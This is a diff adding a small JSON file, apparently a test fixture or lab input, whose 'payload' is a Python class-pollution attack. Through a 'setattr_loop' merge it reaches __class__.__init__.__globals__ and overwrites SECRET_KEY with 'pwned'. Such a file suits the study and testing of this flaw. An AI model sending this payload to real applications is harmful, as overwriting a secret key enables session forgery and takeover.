@@ -1,0 +1,12 @@
+{
+  "merge_fn": "setattr_loop",
+  "payload": {
+    "__class__": {
+      "__init__": {
+        "__globals__": {
+          "SECRET_KEY": "pwned"
+        }
+      }
+    }
+  }
+}
